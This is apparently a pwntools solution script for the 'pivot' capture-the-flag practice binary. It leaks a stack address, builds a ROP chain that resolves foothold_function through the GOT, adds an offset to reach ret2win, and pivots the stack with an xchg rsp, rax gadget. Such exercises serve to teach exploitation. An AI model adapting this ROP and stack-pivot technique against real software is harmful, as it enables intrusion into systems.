from pwn import *
context.log_level = 'debug'

sh = process("./pivot")
elf = ELF("./pivot")
libp = ELF("./libpivot.so")

sh.recvuntil('pivot: ')
use_stack = int(sh.recv(14), 16)
print("hex(use_stack): " + hex(use_stack))

# 0x0000000000400a39 : leave ; ret ; leave;ret 的地址存在截断字符 0a  
xchg_rsp_rax = 0x400b02 # xchg rsp, rax ; ret
pop_rax = 0x400b00 # pop rax ; ret
mov_rax_rax = 0x400b05 # mov rax, qword ptr [rax] ; ret
pop_rbp = 0x400900 # pop rbp ; ret
add_rax_rbp = 0x400b09 # add rax, rbp ; ret
call_rax = 0x40098e # call rax

fun_plt = elf.plt['foothold_function']
fun_got = elf.got['foothold_function']

libp_fun = libp.symbols['foothold_function']
libp_ret = libp.symbols['ret2win']
offset = int(libp_ret-libp_fun )
print("offset: " + str(offset))

payload1 = p64(fun_plt)
payload1 += p64(pop_rax) + p64(fun_got)
payload1 += p64(mov_rax_rax)
payload1 += p64(pop_rbp) + p64(offset)
payload1 += p64(add_rax_rbp)
payload1 += p64(call_rax)

sh.sendline(payload1)

payload2 = b'a'*0x28
payload2 += p64(pop_rax) + p64(use_stack) 
payload2 += p64(xchg_rsp_rax)

sh.sendline(payload2)
sh.recvall()